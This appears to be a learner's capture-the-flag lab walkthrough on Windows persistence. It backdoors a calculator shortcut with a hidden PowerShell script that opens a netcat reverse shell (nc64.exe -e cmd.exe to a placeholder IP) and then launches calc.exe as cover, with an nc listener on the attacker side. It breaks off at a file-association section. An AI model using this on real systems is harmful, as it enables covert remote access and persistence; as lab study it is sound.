# Shortcut Files
1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties

![]()

![]()

3. `PowerShell`
```PowerShell
```
4. `$scriptPath = 'C:\Path\to\directory\<SCRIPT NAME>.ps1';
$scriptContent = @";
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>";
C:\Windows\System32\calc.exe;
"@;
Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
```
5. Change the calculator's icon and shortcut properties to 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1'

![]()

6. `nc -lvnp <PORT NUMBER>`
```Bash
```

7. `C:\flags\flag5.exe`
```Bash
```

# Hijacking File Associations
1. Started this room's machine
2. 
